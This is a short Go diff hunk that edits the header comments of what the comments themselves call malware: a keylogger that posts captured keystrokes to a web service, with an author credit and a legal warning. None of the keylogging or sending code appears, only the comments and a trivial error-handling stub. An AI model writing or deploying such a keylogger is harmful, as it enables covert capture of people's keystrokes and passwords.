@@ -10,9 +10,13 @@ import (
 	"github.com/sirupsen/logrus"
 )
 
-// Stupid Malware
 //
-// 3 Jul 2019 by echel0n
+//
+// 3 Jul 2019 by echel0nn
+// original code was MariNX's example.
+// This code will post the keystrokes to webservice.
+// Warning, code is experimental.
+// You may face charges and penalties for using it in environments that you dont own.
 
 func checkErr(err error) error {
 	if err != nil {
